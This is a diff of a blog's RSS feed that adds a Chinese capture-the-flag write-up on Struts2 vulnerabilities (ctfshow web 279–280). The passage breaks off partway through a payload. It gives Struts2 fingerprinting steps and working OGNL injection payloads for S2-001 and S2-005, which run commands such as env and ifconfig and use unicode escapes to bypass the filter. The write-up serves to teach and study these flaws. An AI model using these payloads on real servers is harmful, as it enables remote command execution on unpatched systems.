@@ -46,6 +46,9 @@
         <category>xml_upload</category>
         <category>flask的session伪造</category>
         <category>二次渲染</category>
+        <category>buuctf，Perl后端文件上传</category>
+        <category>buuctf，xxe漏洞</category>
+        <category>java</category>
         <item>
             <guid isPermalink="true">http://odiws.github.io/2025/02/25/aliyunctf%E9%83%A8%E5%88%86%E5%A4%8D%E7%8E%B0/</guid>
             <title>aliyunctf部分复现</title>
@@ -468,6 +471,82 @@ check=1
  ]]></description>
         </item>
         <item>
+            <guid isPermalink="true">http://odiws.github.io/2024/12/06/ctfshow-web-java/</guid>
+            <title>ctfshow_web_java</title>
+            <link>http://odiws.github.io/2024/12/06/ctfshow-web-java/</link>
+            <category>buuctf</category>
+            <category>java</category>
+            <pubDate>Fri, 06 Dec 2024 09:34:32 +0800</pubDate>
+            <description><![CDATA[ &lt;h2 id=&#34;ctfshow_web_java&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#ctfshow_web_java&#34;&gt;#&lt;/a&gt; ctfshow_web_java&lt;/h2&gt;
+&lt;h3 id=&#34;判断网站是否基于struts2的方法链接&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#判断网站是否基于struts2的方法链接&#34;&gt;#&lt;/a&gt; 判断网站是否基于 Struts2 的方法链接&lt;/h3&gt;
+&lt;pre&gt;&lt;code&gt;通过页面回显的错误消息来判断，页面不回显错误消息时则无效
+通过网页后缀来判断，如.do .action，有可能不准
+如果配置文件中常数extension的值以逗号结尾或者有空值，指明了action可以不带后缀，那么不带后缀的uri也可能是struts2框架搭建的
+如果使用Struts2的rest插件，其默认的struts-plugin.xml指定的请求后缀为xhtml,xml和json
+判断 /struts/webconsole.html 是否存在来进行判断，需要 devMode 为 true
+
+检查响应头中是否包含Struts相关信息。例如:
+X-Powered-By: Servlet/2.5 JSP/2.1 (Struts ?,Struts ?,Lotus-Notes/?,?)
+如果响应头包含Struts相关字段,则很有可能使用了Struts。
+2. 尝试访问Struts常用的Debug调试页面。例如:
+/struts/webconsole.html 
+/struts/debug.html
+如果能访问到以上页面,则证明使用了Struts。
+3. 扫描网站是否存在Struts漏洞可以利用的 endpoints。常见的有:
+- /struts2-showcase/
+- /struts2-blank/
+- /struts2-rest-showcase/
+如果网站包含以上路径,则很可能基于Struts构建。
+4. 发送Struts特有的请求参数以触发响应。例如:
+?debug=command&amp;amp;expression=(%23_memberAccess.allowStaticMethodAccess%3Dtrue,%23foo%3Dnew%20java.lang.Boolean%28false%29,%23context%5B%27com.opensymphony.xwork2.dispatcher.HttpServletResponse%27%5D.org.apache.struts2.ServletActionContext.getResponse().getWriter().println%28%23foo%29)`
+
+如果该请求能够响应,则证明网站使用Struts构建。
+5. 其他方式:检查页面源代码是否包含Struts相关JS文件引入;扫描网站可能存在的已知Struts漏洞; fuzzing网站的参数以寻找Struts漏洞等。
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;web279-300 都是 Struts2 的漏洞&lt;/p&gt;
+&lt;h3 id=&#34;279&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#279&#34;&gt;#&lt;/a&gt; 279:&lt;/h3&gt;
+&lt;h4 id=&#34;s2001命令执行&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#s2001命令执行&#34;&gt;#&lt;/a&gt; S2–001 (命令执行):&lt;/h4&gt;
+&lt;pre&gt;&lt;code&gt;漏洞原理：
+struts2漏洞 S2-001是当用户提交表单数据且验证失败时，服务器使用OGNL表达式解析用户先前提交的参数值，%&amp;#123;value&amp;#125;并重新填充相应的表单数据
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;struts2 漏洞 S2-001 是当用户提交表单数据且验证失败时，服务器使用 OGNL 表达式解析用户先前提交的参数值，%{value} 并重新填充相应的表单数据。例如，在注册或登录页面中。如果提交失败，则服务器通常默认情况下将返回先前提交的数据。由于服务器用于 %{value} 对提交的数据执行 OGNL 表达式解析，因此服务器可以直接发送有效载荷来执行命令。&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;了解下OGNL表达式中三个符号 %，#，$ 的含义
+
+%的用途是在标志的属性为字符串类型时，计算OGNL表达式%&amp;#123;&amp;#125;中的值
+#的用途访主要是访问非根对象属性，因为Struts 2中值栈被视为根对象，所以访问其他非根对象时，需要加#前缀才可以调用
+$主要是在Struts 2配置文件中，引用OGNL表达式
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;payload：&lt;/p&gt;
+&lt;figure class=&#34;highlight java&#34;&gt;&lt;figcaption data-lang=&#34;java&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;// 获取 tomcat 路径&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token operator&#34;&gt;%&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;tomcatBinDir&amp;#123;&#34;&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;token annotation punctuation&#34;&gt;@java.lang.System&lt;/span&gt;&lt;span class=&#34;token annotation punctuation&#34;&gt;@getProperty&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;user.dir&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;&amp;#125;&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;// 获取 web 路径&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token operator&#34;&gt;%&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;#req&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token annotation punctuation&#34;&gt;@org.apache.struts2.ServletActionContext&lt;/span&gt;&lt;span class=&#34;token annotation punctuation&#34;&gt;@getRequest&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;#response&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;#context&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;get&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;com.opensymphony.xwork2.dispatcher.HttpServletResponse&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;getWriter&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;#response&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;println&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;#req&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;getRealPath&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token char&#34;&gt;&#39;/&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;#response&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;flush&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;#response&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;close&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;6&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;7&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;// 命令执行 env，flag 就在其中&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;8&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;password&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;%&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;#a&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;token class-name&#34;&gt;&lt;span class=&#34;token namespace&#34;&gt;java&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;lang&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;/span&gt;ProcessBuilder&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;token class-name&#34;&gt;&lt;span class=&#34;token namespace&#34;&gt;java&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;lang&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;/span&gt;String&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;env&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;redirectErrorStream&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token boolean&#34;&gt;true&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;start&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;#b&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;#a&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;getInputStream&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;#c&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;token class-name&#34;&gt;&lt;span class=&#34;token namespace&#34;&gt;java&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;io&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;/span&gt;InputStreamReader&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;#b&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;#d&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;token class-name&#34;&gt;&lt;span class=&#34;token namespace&#34;&gt;java&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;io&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;/span&gt;BufferedReader&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;#c&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;#e&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;char&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;50000&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;#d&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;read&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;#e&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;#f&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;#context&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;get&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;com.opensymphony.xwork2.dispatcher.HttpServletResponse&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;#f&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;getWriter&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;println&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;token class-name&#34;&gt;&lt;span class=&#34;token namespace&#34;&gt;java&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;lang&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;/span&gt;String&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;#e&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;#f&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;getWriter&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;flush&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;#f&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;getWriter&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;close&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;&amp;amp;&lt;/span&gt;username&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;&lt;img data-src=&#34;C:%5CUsers%5C86182%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20241206093701182.png&#34; alt=&#34;image-20241206093701182&#34;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;C:%5CUsers%5C86182%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20241206100124578.png&#34; alt=&#34;image-20241206100124578&#34;&gt;&lt;/p&gt;
+&lt;p&gt;ctfshow 将 http 改成 https 还是有点影响做题了&lt;/p&gt;
+&lt;p&gt;这个用工具会超时（连接超时，不能进行命令执行）&lt;/p&gt;
+&lt;h3 id=&#34;280&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#280&#34;&gt;#&lt;/a&gt; 280：&lt;/h3&gt;
+&lt;h4 id=&#34;s2-005参数作为ognl语句执行&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#s2-005参数作为ognl语句执行&#34;&gt;#&lt;/a&gt; S2-005 (参数作为 ognl 语句执行)&lt;/h4&gt;
+&lt;p&gt;先来了解下 S2-003&lt;/p&gt;
+&lt;p&gt;Struts2 将 HTTP 的每个参数名解析为 ognl 语句执行，而 ognl 表达式是通过 #来访问 struts 的对象，Struts2 框架虽然过滤了 #来进行过滤，但是可以通过 unicode 编码（u0023）或 8 进制（43）绕过了安全限制，达到代码执行的效果&lt;/p&gt;
+&lt;p&gt;影响版本：Struts 2.0.0 - Struts 2.0.11.2&lt;/p&gt;
+&lt;p&gt;再看 S2-005，参考链接&lt;/p&gt;
+&lt;p&gt;S2-005 和 S2-003 的原理是类似的，因为官方在修补 S2-003 不全面，导致用户可以绕过官方的安全配置（禁止静态方法调用和类方法执行），再次造成的漏洞，可以说是升级版的 S2-005 是升级版的 S2-003&lt;/p&gt;
+&lt;p&gt;影响版本：Struts 2.0.0 - Struts 2.1.8.1&lt;/p&gt;
+&lt;p&gt;poc&lt;/p&gt;
+&lt;figure class=&#34;highlight java&#34;&gt;&lt;figcaption data-lang=&#34;java&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token operator&#34;&gt;?&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&#39;\u0023context&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;\&#39;&lt;span class=&#34;token class-name&#34;&gt;&lt;span class=&#34;token namespace&#34;&gt;xwork&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;/span&gt;MethodAccessor&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;denyMethodExecution\&#39;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;\u003dfalse&#39;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;bla&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;bla&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&#39;\u0023_memberAccess&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;excludeProperties\u003d&lt;span class=&#34;token annotation punctuation&#34;&gt;@java.util.Collections&lt;/span&gt;&lt;span class=&#34;token annotation punctuation&#34;&gt;@EMPTY_SET&lt;/span&gt;&#39;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;kxlzx&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;kxlzx&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&#39;\u0023mycmd\u003d\&#39;ifconfig\&#39;&#39;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;bla&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;bla&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&#39;\u0023myret\u003d&lt;span class=&#34;token annotation punctuation&#34;&gt;@java.lang.Runtime&lt;/span&gt;&lt;span class=&#34;token annotation punctuation&#34;&gt;@getRuntime&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;exec&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;\u0023mycmd&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&#39;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;bla&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;bla&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token class-name&#34;&gt;A&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&#39;\u0023mydat\u003dnew\&lt;span class=&#34;token number&#34;&gt;40&lt;/span&gt;java&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;io&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;DataInputStream&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;\u0023myret&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;getInputStream&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&#39;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;bla&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token class-name&#34;&gt;B&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&#39;\u0023myres\u003dnew\&lt;span class=&#34;token number&#34;&gt;40&lt;/span&gt;byte&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;51020&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&#39;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;bla&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token class-name&#34;&gt;C&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&#39;\u0023mydat&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;readFully&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;\u0023myres&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&#39;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;bla&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token class-name&#34;&gt;D&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&#39;\u0023mystr\u003dnew\&lt;span class=&#34;token number&#34;&gt;40&lt;/span&gt;java&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;lang&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;String&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;\u0023myres&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&#39;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;bla&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&#39;\u0023myout\u003d&lt;span class=&#34;token annotation punctuation&#34;&gt;@org.apache.struts2.ServletActionContext&lt;/span&gt;&lt;span class=&#34;token annotation punctuation&#34;&gt;@getResponse&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&#39;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;bla&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;bla&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token 